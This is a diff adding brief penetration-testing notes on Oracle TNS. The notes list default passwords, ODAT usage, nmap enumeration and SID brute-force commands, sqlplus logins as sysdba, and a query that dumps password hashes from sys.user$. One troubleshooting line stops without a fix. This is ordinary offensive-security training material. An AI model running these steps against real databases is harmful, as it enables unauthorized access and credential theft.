@@ -1,0 +1,40 @@
+The oracle trannsparent network substrate (Oracle TNS) server is a protocol that facilitates communication between oracle databases and appliations. It has become the preferred solutions for managing large complex databases in the healthcare finance and retail industries; usually found on p1521 as default; Oracle 9 has default password CHANGE_ON_INSTALL; oracle 10 has no default password set; oracle DBSNMP has default password dbsnmp;
+
+Each database is found in the tnsnames.ora file on the server (CLIENT SIDE)
+there is a listener.ora; server-side configuration file that defines the listener process' properties and params (SERVER SIDE)
+
+TO GET STARTED:
+use the script ./install_odat.sh in the same directory as this one
+
+use odat like ./odat.py all -s <target-ip>
+
+to enumerate if you've found the port:
+sudo nmap -p<port#> -sV <target-ip> --open
+
+to brute force SID:
+sudo nmap -p<port#> -sV <target-ip> --open --script oracle-sid-brute
+
+you can login using sqlplus:
+
+sqlplus <username>/<password>@<target-ip>/XE
+
+or
+
+sqlplus <username>/<password>@<target-ip>/XE as sysdba
+
+If you come across the following error sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory:
+
+
+when logged in you can list all tables
+select table_name from all_tables;
+
+and user roles privileges
+select * from user_role_privs;
+
+
+you can use creds to try and gain system database admin priviliges
+sqlplus <username>/<password>@<target-ip>/XE as sysdba
+
+from here you can try to get password hashes
+select name, password from sys.user$;
+
